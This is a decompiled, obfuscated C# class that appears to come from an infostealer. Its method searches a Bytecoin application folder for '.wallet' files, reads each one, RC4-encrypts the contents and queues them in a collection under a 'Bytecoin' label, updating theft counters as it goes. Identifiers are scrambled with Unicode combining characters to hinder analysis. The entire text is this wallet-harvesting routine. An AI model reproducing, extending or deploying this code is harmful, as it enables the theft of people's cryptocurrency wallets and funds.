using System;
using System.IO;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x02000068 RID: 104
	internal class Class_80
	{
		// Token: 0x060001E8 RID: 488 RVA: 0x000107CC File Offset: 0x0000E9CC
		public static void pmethod_239(string str_0)
		{
			try
			{
				if (Directory.Exists(Class_80.field_1))
				{
					foreach (string path in Directory.GetFiles(Class_80.field_1))
					{
						if (Path.GetExtension(path).Equals(".wallet"))
						{
							Class_53.\u0347\u0020\u0328\u0020\u0369\u0E47h\u0364\u0358\u036D\u036B\u0324\u0322\u0E47\u031F\u0369qhgddlayjusqyuib\u0353c\u0347\u036Dr\u0020\u0E47\u0356\u0356\u0332\u036D\u0347\u0325\u030E\u0E47\u0356gugwsaxccacjclln.Add(str_0 + "\\Bytecoin\\" + Path.GetFileName(path), Class_47.RC4(File.ReadAllBytes(path)));
						}
					}
					Class_80.field_0++;
					Class_54.field_0++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000139 RID: 313
		public static int field_0;

		// Token: 0x0400013A RID: 314
		public static string field_1 = Class_47.\u030A\u0330\u0314\u0E47\u036D\u0020\u0331\u036B\u0310\u0341\u0353\u0333\u035F\u0368\u0333\u0369fscvyixozutspogr\u0316\u0020\u0E47\u0340\u0020\u0325\u035A\u0342\u032F\u0366\u0303\u036D\u0344\u0302\u0338\u032Cmiwjanndutheeold + "\\bytecoin\\";
	}
}
